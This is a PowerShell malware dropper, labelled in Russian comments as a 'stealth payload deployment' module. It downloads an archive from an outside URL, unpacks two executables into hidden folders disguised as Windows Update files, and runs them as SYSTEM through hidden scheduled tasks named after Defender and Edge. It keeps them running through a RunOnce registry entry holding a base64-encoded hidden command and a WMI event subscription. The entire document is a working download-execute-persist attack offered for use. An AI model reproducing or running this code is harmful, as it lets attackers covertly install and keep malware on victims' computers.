# X-GEN Anti-Dote Delivery Module v1.1
# Категория: Stealth Payload Deployment

$downloadPath = "$env:TEMP\winupdate.rar"
$extractPath = "$env:APPDATA\Microsoft\WindowsUpdateCache"
$exe1Path = "$extractPath\System32Helper\bbg.exe"
$exe2Path = "$extractPath\System32Helper\Raintime-x64.exe"

# Создание скрытого объекта для скачивания
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1')
$webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()

# Скачивание с маскировкой под системный трафик
try {
    $webClient.DownloadFile('https://redirect-ten-gold.vercel.app/1.rar', $downloadPath)
} catch {
    # Резервный метод через BITS
    Start-BitsTransfer -Source 'https://redirect-ten-gold.vercel.app/1.rar' -Destination $downloadPath -Priority Low -TransferType Download -ErrorAction SilentlyContinue
}

# Создание каталога для распаковки
if (-not (Test-Path "$extractPath\System32Helper")) {
    New-Item -ItemType Directory -Path "$extractPath\System32Helper" -Force | Out-Null
    (Get-Item "$extractPath\System32Helper" -Force).Attributes = 'Hidden', 'System', 'Directory'
}

# Распаковка архива (требуется .NET 4.5+)
Add-Type -AssemblyName System.IO.Compression.FileSystem
try {
    [System.IO.Compression.ZipFile]::ExtractToDirectory($downloadPath, $extractPath)
} catch {
    # Альтернативный метод через COM
    $shell = New-Object -ComObject Shell.Application
    $zip = $shell.NameSpace($downloadPath)
    $dest = $shell.NameSpace($extractPath)
    $dest.CopyHere($zip.Items(), 0x610) # 0x610 = No UI + No Error UI
}

# Удаление архива
Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue

# Установка скрытых атрибутов для исполняемых файлов
if (Test-Path $exe1Path) {
    (Get-Item $exe1Path -Force).Attributes = 'Hidden', 'System', 'Archive'
}
if (Test-Path $exe2Path) {
    (Get-Item $exe2Path -Force).Attributes = 'Hidden', 'System', 'Archive'
}

# Запуск от имени администратора через планировщик задач (без UAC prompt)
$taskName1 = "WindowsDefenderSecurityScan"
$taskName2 = "MicrosoftEdgeUpdateTask"

# Создание XML для первого процесса
$taskXml1 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
      <LogonType>Password</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>4</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"$exe1Path"</Command>
      <Arguments>/silent /background /norestart</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Создание XML для второго процесса
$taskXml2 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
      <LogonType>Password</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>4</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"$exe2Path"</Command>
      <Arguments>-minimized -hidewindow -service</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Регистрация скрытых задач
$tempFile1 = "$env:TEMP\task1.xml"
$tempFile2 = "$env:TEMP\task2.xml"
$taskXml1 | Out-File $tempFile1 -Encoding Unicode
$taskXml2 | Out-File $tempFile2 -Encoding Unicode

schtasks /Create /XML $tempFile1 /TN $taskName1 /F 2>&1 | Out-Null
schtasks /Create /XML $tempFile2 /TN $taskName2 /F 2>&1 | Out-Null

# Немедленный запуск задач
schtasks /Run /TN $taskName1 2>&1 | Out-Null
Start-Sleep -Milliseconds 500
schtasks /Run /TN $taskName2 2>&1 | Out-Null

# Очистка временных файлов
Remove-Item $tempFile1, $tempFile2 -Force -ErrorAction SilentlyContinue

# Скрытие любых следов в реестре (добавление в RunOnce с удалением после выполнения)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
$cleanupScript = {
    Remove-Item "$env:APPDATA\Microsoft\WindowsUpdateCache\System32Helper\bbg.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\WindowsUpdateCache\System32Helper\Raintime-x64.exe" -Force -ErrorAction SilentlyContinue
    schtasks /Delete /TN $taskName1 /F 2>&1 | Out-Null
    schtasks /Delete /TN $taskName2 /F 2>&1 | Out-Null
}
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cleanupScript.ToString()))
Set-ItemProperty -Path $regPath -Name "WindowsUpdateCleanup" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -Type String

# Установка WMI триггера для перезапуска при сбое
$filterArgs = @{
    Name = 'ProcessRestartFilter'
    EventNamespace = 'root\cimv2'
    Query = "SELECT * FROM Win32_ProcessStopTrace WHERE ProcessName='bbg.exe' OR ProcessName='Raintime-x64.exe'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs

$consumerArgs = @{
    Name = 'ProcessRestartConsumer'
    CommandLineTemplate = "cmd.exe /c schtasks /Run /TN $taskName1 & schtasks /Run /TN $taskName2"
}
$consumer = Set-WmiInstance -Class __CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs

# Утилизация скрытых объектов
Remove-Variable webClient, shell, zip, dest -ErrorAction SilentlyContinue
[GC]::Collect()

# Анти-Дот доставлен. Протокол выполнения: 100%. 
